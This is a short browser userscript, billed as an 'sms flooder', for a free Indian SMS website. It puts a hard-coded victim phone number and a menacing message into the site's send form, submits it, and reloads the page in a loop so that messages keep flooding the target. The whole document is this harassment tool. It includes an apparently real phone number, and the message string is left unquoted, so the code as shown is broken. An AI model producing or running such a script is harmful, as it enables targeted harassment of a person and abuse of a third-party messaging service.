// ==UserScript==
// @name          Anonymous MYCANTOS.COM sms flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*mycantos.com/*
// ==/UserScript==

var victim=7250214431; //Enter victims number here
var msg= ur moblie will blast in dew seconds!!!  //Enter ur msg here

if(document.location=="http://www.mycantos.com/send-free-long-sms-india.php"||document.location=="http://www.mycantos.com/send-free-long-sms-india.php")
{
document.getElementsByName("SMSnumber")[0].value=victim;
document.getElementsByName("SMSmessage")[0].value=msg;
document.forms[1].submit();
}

if(document.location=="http://www.mycantos.com/send-free-long-sms-india.php")
document.location="http://www.mycantos.com/send-free-long-sms-india.php"